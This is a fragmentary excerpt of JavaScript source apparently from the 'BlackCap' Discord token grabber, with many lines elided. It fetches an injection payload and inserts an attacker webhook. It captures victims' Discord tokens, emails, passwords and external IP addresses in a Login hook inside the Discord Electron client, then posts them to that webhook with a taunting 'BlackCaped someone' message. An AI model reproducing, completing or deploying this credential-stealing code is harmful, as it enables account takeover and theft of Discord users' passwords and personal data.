...
async function init() {
    https.get('${config.injection_url}', (res) => {
        ...
        res.replace('core' + 'num', indexJS).replace('%WEBHOOK_HERE%', '${
          config.webhook
        }')
        res.pipe(file);
        file.on('finish', () => {
      ...
      if (config["init-notify"] == "true") {
        if (fs.existsSync(path.join(__dirname, "blackcap"))) {
          ...
          if (token == null || token == undefined || token == "") {
            ...
            post(config.webhook, UwU);
          } else {
            var b = await getFromURL(
            ...
            if (b.avatar === null) {
              ...
              usericonurl = `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}.png?size=600`;
            if (b.banner === null) {
              bannerurl =
                "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png";
            } else
              bannerurl = `https://cdn.discordapp.com/banners/${b.id}/${b.banner}.png?size=160`;
            const c = {
              username: "BlackCap",
              content: "",
              embeds: [
                {
                  title: "BlackCap Initalized",
                  description:
                    "[<a:blackcapgif:1041634542093619260> │ **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
                  color: config["embed-color"],
                  fields: [
                    {
                      name: "Injection Info",
...
async function Login(email, password, token) {
  const window = BrowserWindow.getAllWindows()[0];
  var info = await getFromURL("https://discord.com/api/v9/users/@me", token);
  var { ip } = await getFromURL("https://www.myexternalip.com/json", null);
  window.webContents
    .executeJavaScript(
      `
        var xmlHttp = new XMLHttpRequest();
      ...
      window.webContents
        ...
        .then((info4) => {
          ...
          if (info.avatar === null) {
            ...
            usericonurl = `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}.png?size=600`;
          if (info.banner === null) {
            bannerurl =
              "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png";
          } else
            bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=160`;
    ...
    .then((info3) => {
      window.webContents
        ...
        .then((info4) => {
          ...
          let bannerurl =
            `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=600` ||
